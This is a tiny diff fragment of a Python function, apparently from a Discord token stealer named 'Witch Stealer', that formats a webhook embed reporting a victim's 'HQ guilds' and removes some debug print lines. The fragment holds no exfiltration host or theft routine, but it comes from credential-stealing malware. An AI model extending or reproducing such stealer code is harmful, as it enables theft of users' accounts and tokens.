@@ -261,9 +261,8 @@ def tokens(token: str):
                 "value": hq_guilds,
                 "inline": False
             })
-            print("found")
         else:
-            print("No HQ guilds found")
+            pass
 
         embed = {
             "username": "Witch Stealer",
